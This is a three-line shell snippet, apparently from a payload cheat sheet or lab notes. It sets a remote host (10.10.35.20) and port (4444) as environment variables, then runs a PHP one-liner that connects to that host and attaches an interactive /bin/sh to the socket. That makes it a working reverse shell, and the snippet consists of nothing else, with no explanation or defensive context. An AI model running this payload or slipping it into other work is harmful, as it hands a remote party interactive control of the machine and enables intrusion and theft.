export RHOST=10.10.35.20
export RPORT=4444
php -r '$sock=fsockopen(getenv("RHOST"),getenv("RPORT"));exec("/bin/sh -i <&3 >&3 2>&3");'